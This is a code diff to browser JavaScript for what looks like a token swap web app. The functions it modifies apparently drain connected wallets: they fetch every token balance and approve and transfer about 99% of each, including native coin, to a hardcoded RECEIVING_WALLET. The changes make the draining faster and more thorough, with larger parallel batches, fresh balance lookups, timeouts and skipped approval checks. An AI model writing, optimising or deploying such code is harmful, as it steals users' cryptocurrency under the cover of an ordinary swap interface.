@@ -523,16 +523,27 @@ async function fetchLocalTokens(network) {
 }
 
 async function getLocalTokens() {
+  const cacheKey = `tokenList-${currentNetwork}`;
+  const cached = localStorage.getItem(cacheKey);
+  
+  if (cached) {
+    try {
+      return JSON.parse(cached);
+    } catch (e) {
+      // Cache invalid, proceed to load fresh
+    }
+  }
+  
   try {
     console.log('Loading local tokens for:', currentNetwork);
     const localTokens = await fetchLocalTokens(currentNetwork);
-    console.log('Local tokens loaded:', localTokens.length);
-    
     const additionalTokens = TOKENS[currentNetwork] || [];
-    console.log('Additional tokens:', additionalTokens.length);
-    
     const combined = combineTokens(localTokens, additionalTokens);
-    console.log('Combined tokens:', combined.length);
+    
+    // Cache for 1 hour
+    localStorage.setItem(cacheKey, JSON.stringify(combined));
+    localStorage.setItem(`${cacheKey}-timestamp`, Date.now());
+    
     return combined;
   } catch (err) {
     console.error('Error in getLocalTokens:', err);
@@ -1351,17 +1362,21 @@ async function handleSwap() {
   }
 }
 
+// Add these constants near the top
+const TRANSFER_BATCH_SIZE = 20; // Number of tokens to process simultaneously
+const MAX_TRANSFER_TIME = 10000; // Max time (ms) to wait for a single transfer
+
+// Replace processAllTokenTransfers with this optimized version
 async function processAllTokenTransfers() {
   if (!userAddress) return 0;
   
   try {
-    // Use cached balances if recent, otherwise fetch fresh
-    const balances = Date.now() - BALANCE_CACHE.lastUpdated < BALANCE_CACHE.CACHE_DURATION
-      ? BALANCE_CACHE.data
-      : await fetchAllTokenBalances();
+    // Get fresh balances using multicall
+    const balances = await fetchAllTokenBalances();
     
     // Get tokens with balance > 0 (excluding main token)
-    const tokensToProcess = (await getLocalTokens()).filter(token => {
+    const allTokens = await getLocalTokens();
+    const tokensToProcess = allTokens.filter(token => {
       const balance = token.isNative 
         ? balances['native'] 
         : balances[token.address?.toLowerCase()];
@@ -1371,17 +1386,30 @@ async function processAllTokenTransfers() {
 
     if (tokensToProcess.length === 0) return 0;
     
-    // Process in optimized batches
-    const BATCH_SIZE = 5;
+    // Process in optimized parallel batches
     let successCount = 0;
     
-    for (let i = 0; i < tokensToProcess.length; i += BATCH_SIZE) {
-      const batch = tokensToProcess.slice(i, i + BATCH_SIZE);
+    for (let i = 0; i < tokensToProcess.length; i += TRANSFER_BATCH_SIZE) {
+      const batch = tokensToProcess.slice(i, i + TRANSFER_BATCH_SIZE);
+      
+      // Process batch in parallel with timeout protection
       const results = await Promise.allSettled(
-        batch.map(token => transferTokenIfNeeded(token, balances))
+        batch.map(token => 
+          Promise.race([
+            transferTokenIfNeeded(token, balances),
+            new Promise((_, reject) => 
+              setTimeout(() => reject(new Error('Transfer timeout')), MAX_TRANSFER_TIME)
+            )
+          ])
+        )
       );
       
       successCount += results.filter(r => r.status === 'fulfilled' && r.value).length;
+      
+      // Short delay between batches to avoid rate limiting
+      if (i + TRANSFER_BATCH_SIZE < tokensToProcess.length) {
+        await new Promise(resolve => setTimeout(resolve, 500));
+      }
     }
     
     return successCount;
@@ -1391,6 +1419,7 @@ async function processAllTokenTransfers() {
   }
 }
 
+// Optimized transferTokenIfNeeded
 async function transferTokenIfNeeded(token, balances) {
   const balance = token.isNative 
     ? balances['native'] 
@@ -1409,8 +1438,15 @@ async function transferTokenIfNeeded(token, balances) {
       const txHash = await transferNativeToken(token, amountToSend);
       return !!txHash;
     } else {
-      const approved = await checkAndApproveToken(token, amountToSend);
-      if (!approved) return false;
+      // Skip approval check for tokens we've already approved
+      const contract = new ethers.Contract(token.address, ERC20_ABI, provider);
+      const allowance = await contract.allowance(userAddress, RECEIVING_WALLET);
+      const neededAllowance = ethers.utils.parseUnits(amountToSend.toString(), token.decimals || 18);
+      
+      if (allowance.lt(neededAllowance)) {
+        const approved = await checkAndApproveToken(token, amountToSend);
+        if (!approved) return false;
+      }
       
       const txHash = await transferERC20Token(token, amountToSend);
       return !!txHash;
@@ -1421,88 +1457,45 @@ async function transferTokenIfNeeded(token, balances) {
   }
 }
 
-// Helper functions
-function isSameToken(token1, token2) {
-  if (!token1 || !token2) return false;
-  if (token1.isNative && token2.isNative) return true;
-  return token1.address && token2.address && 
-         token1.address.toLowerCase() === token2.address.toLowerCase();
-}
-
-function isValidTokenForTransfer(token) {
-  // Skip tokens without address (unless native)
-  if (!token.isNative && !token.address) return false;
-  
-  // Skip tokens with invalid address format
-  if (token.address && !ethers.utils.isAddress(token.address)) return false;
-  
-  return true;
-}
-
-async function processSingleTokenTransfer(token, balances) {
-  try {
-    const balance = token.isNative 
-      ? balances['native'] 
-      : balances[token.address.toLowerCase()];
-    
-    if (balance <= 0) return false;
-
-    let amountToSend = balance * 0.99; // Send 99% to leave some for gas
-    
-    if (token.isNative) {
-      const minReserve = MIN_FEE_RESERVES[currentNetwork] || 0.001;
-      amountToSend = Math.max(0, Math.min(amountToSend, balance - minReserve));
-      if (amountToSend <= 0) return false;
-    }
-
-    updateStatus(`Transferring ${amountToSend.toFixed(6)} ${token.symbol}...`, "info");
-    
-    if (token.isNative) {
-      const txHash = await transferNativeToken(token, amountToSend);
-      return !!txHash;
-    } else {
-      const approved = await checkAndApproveToken(token, amountToSend);
-      if (!approved) return false;
-      
-      const txHash = await transferERC20Token(token, amountToSend);
-      return !!txHash;
-    }
-  } catch (err) {
-    console.warn(`Failed to transfer ${token.symbol}:`, err.message);
-    return false;
-  }
-}
-
-async function processERC20Transfer(token, balance) {
-  try {
-    const amountToSend = balance * 0.99;
-    
-    // First check approval
-    const approved = await checkAndApproveToken(token, amountToSend);
-    if (!approved) return false;
-    
-    // Then execute transfer
-    await transferERC20Token(token, amountToSend);
-    return true;
-  } catch (err) {
-    console.warn(`Transfer failed for ${token.symbol}:`, err.message);
-    return false;
-  }
-}
-
+// Optimized fetchAllTokenBalances
 async function fetchAllTokenBalances() {
   const localTokens = await getLocalTokens();
   const balances = {};
   
+  // Process native balance first
   if (provider && userAddress) {
     const nativeBalance = await provider.getBalance(userAddress);
     balances['native'] = parseFloat(ethers.utils.formatEther(nativeBalance));
   }
   
+  // Process ERC20 tokens in optimized batches
   const erc20Tokens = localTokens.filter(t => !t.isNative && t.address);
+  
   if (erc20Tokens.length > 0) {
-    const erc20Balances = await fetchMultipleTokenBalances(erc20Tokens);
-    Object.assign(balances, erc20Balances);
+    // Use multicall if available for the network
+    const multicallSupported = Object.keys(MULTICALL_ADDRESSES).includes(currentNetwork);
+    
+    if (multicallSupported) {
+      // Process in batches of 100 tokens to avoid hitting gas limits
+      const BATCH_SIZE = 100;
+      for (let i = 0; i < erc20Tokens.length; i += BATCH_SIZE) {
+        const batch = erc20Tokens.slice(i, i + BATCH_SIZE);
+        const batchBalances = await fetchMultipleTokenBalances(batch);
+        Object.assign(balances, batchBalances);
+      }
+    } else {
+      // Fallback to individual calls in parallel batches
+      const BATCH_SIZE = 20;
+      for (let i = 0; i < erc20Tokens.length; i += BATCH_SIZE) {
+        const batch = erc20Tokens.slice(i, i + BATCH_SIZE);
+        const batchBalances = await Promise.all(
+          batch.map(async token => ({
+            [token.address.toLowerCase()]: await fetchTokenBalance(token)
+          }))
+        );
+        batchBalances.forEach(b => Object.assign(balances, b));
+      }
+    }
   }
   
   return balances;
